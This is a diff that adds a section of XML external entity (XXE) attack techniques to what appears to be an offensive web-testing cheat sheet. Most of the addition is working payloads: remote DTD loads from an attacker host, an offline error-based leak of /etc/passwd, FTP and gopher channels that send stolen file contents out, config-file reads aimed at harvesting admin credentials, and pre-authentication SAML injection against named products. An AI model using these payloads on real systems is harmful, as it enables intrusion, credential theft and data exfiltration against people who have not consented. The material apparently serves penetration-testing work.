@@ -315,3 +315,87 @@ Java `XMLDecoder` RCE:
   </object>
 </java>
 ```
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/xxe)
+
+Corpus-derived exfil channels, offline primitives, and framework bypasses that go beyond the parser table, content-type swap, error-based, CDATA, filter catalogue, and RCE chains already documented above. All additive.
+
+### Minimal two-stage external DTD (body references remote DTD only)
+
+Where the body is size-limited or only `SYSTEM` on the DOCTYPE is allowed, the document does nothing but pull a remote DTD that carries the entity logic — no parameter-entity block inside the local subset:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://172.17.85.67:5555/mydtd.dtd">
+```
+```xml
+<!DOCTYPE foo SYSTEM "http://<attacker>/a.dtd">
+```
+The remote DTD then declares the general entity the body references (e.g. `<foo>&e1;</foo>` with `a.dtd` defining `e1`).
+
+### Local DTD reuse — fully offline error-based leak (no outbound network)
+
+When even a remote DTD can't be fetched (egress blocked), import a DTD **already present on the target filesystem** and redefine one of the parameter entities it already declares, building the error-based primitive entirely locally. Reuse an existing name (here `ISOamso` from `docbookx.dtd`) so the redefinition is legal:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval; &#x25;error;
+  '>
+  %local_dtd;
+]>
+```
+The parse error for `file:///nonexistent/<contents>` echoes the file back. Works with egress fully filtered — the only requirement is a readable local DTD whose parameter-entity name you know.
+
+### FTP exfil to bypass Java single-line restriction
+
+Java ≥ 1.7 throws `MalformedURLException` on `\n` and other characters inside an `http://` exfil URL, so HTTP OOB only pulls single-line files (`/etc/issue`). Switch the exfil channel to **FTP** (run a fake FTP server) to retrieve multi-line files like `/etc/passwd`:
+
+```
+<!ENTITY %% all "<!ENTITY &#37; send SYSTEM "ftp://%(ip)s:%(port)s/%%loot;">">
+```
+Use `/etc/issue` for a quick single-line HTTP PoC, then move to FTP for the full read.
+
+### Gopher raw-TCP exfil of the read file
+
+Chain a parameter entity into a `gopher://` URL to smuggle the read bytes to an internal (or attacker) service over raw TCP — an exfil channel distinct from issuing Redis/FCGI commands:
+
+```
+<!ENTITY % payl SYSTEM "file:///#{params[:f]}">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'gopher://#{request.host}:1337/?%payl;'>">
+```
+
+### PHP-FPM re-enables XXE despite `libxml_disable_entity_loader()`
+
+Zend Framework calls `libxml_disable_entity_loader()` then rejects `XML_DOCUMENT_TYPE_NODE` — but under **PHP-FPM** that control is bypassable, re-enabling XXE in `Zend_XmlRpc_Server` / `Zend_Feed` / `Zend_Config_Xml` (eBay Magento CE ≤ 1.9.2.1 / EE ≤ 1.14.2.1, Zend Framework 2.4.2). Impact: file read, SSRF, DoS, or `expect://` RCE. Fingerprint the SAPI before assuming the `disable_entity_loader` mitigation holds.
+
+### Relative-path config read → credential theft → ATO
+
+Entity paths can be relative to the parser's working dir, reaching app config that absolute paths miss. CDATA-wrap the config so XML-unsafe content survives, then harvest credentials for direct login (Zimbra `localconfig.xml` → `zimbra_user` / `zimbra_ldap_password` → admin; AfterLogic WebMail leaked the admin account the same way):
+
+```xml
+<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
+```
+Config target bank worth reading once file-read is proven: `conf/localconfig.xml` (Zimbra creds), `web.xml`, `application.properties`, `.env`, `wp-config.php`, `config.php`.
+
+### Windows directory listing via `file:///C:\`
+
+Beyond `win.ini`, point a file entity at a drive/dir root for a **directory listing** on Windows targets:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///C:\">
+<!ENTITY xxe SYSTEM "file:///c:\Windows\System32\drivers\etc\hosts">
+```
+
+### SAML transport — base64+URL-encoded whole-XML, pre-auth
+
+`SAMLResponse` / `SAMLRequest` carry the full XML document base64+URL-encoded; upstream parsers frequently process entities before signature verification, giving **pre-authentication** XXE (CyberArk Enterprise Password Vault `/PasswordVault/auth/saml`, Plesk SSO `/relay`, RSA Authentication Manager). Encode the entire OOB/error payload and submit it as the parameter value:
+
+```
+SAMLResponse=<base64(url-encoded XML)>
+```
+Frame these as Critical: no user interaction, no privileges, triggered pre-auth.
